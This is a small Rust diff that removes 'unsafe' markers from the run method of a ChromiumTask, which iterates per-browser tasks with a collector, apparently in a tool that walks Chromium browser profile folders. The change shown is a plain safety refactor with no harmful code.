@@ -108,10 +108,10 @@ fn is_in_profile_folder(path: &Path) -> bool {
 }
 
 impl<C: Collector> Task<C> for ChromiumTask<'_, C> {
-    unsafe fn run(&self, parent: &Path, collector: &C) {
+    fn run(&self, parent: &Path, collector: &C) {
         for (browser, task) in &self.tasks {
             let parent = parent / browser.name;
-            unsafe { task.run(&parent, collector) }
+            task.run(&parent, collector)
         }
     }
 }
